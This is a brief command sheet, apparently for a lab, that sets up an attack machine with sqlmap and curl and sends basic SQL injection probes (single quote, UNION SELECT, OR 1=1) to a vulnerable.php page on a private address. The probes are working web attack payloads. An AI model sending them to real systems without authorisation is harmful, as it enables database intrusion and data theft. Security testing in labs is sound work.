
###########################################
### Remote attack machine  ################
###########################################

# For Debian/Ubuntu
apt-get update
apt-get install -y sqlmap curl wget python3 python3-pip

# For RHEL/CentOS/Rocky
dnf install -y epel-release
dnf install -y sqlmap curl wget python3 python3-pip


# Test with a single quote (basic SQL injection attempt)
curl --noproxy "*" http://10.10.0.2/vulnerable.php?id=1%27

# Test with a UNION statement
curl --noproxy "*" http://10.10.0.2/vulnerable.php?id=1%20UNION%20SELECT%201,2,3

# Test with an OR statement
curl --noproxy "*" http://10.10.0.2/vulnerable.php?id=1%20OR%201=1


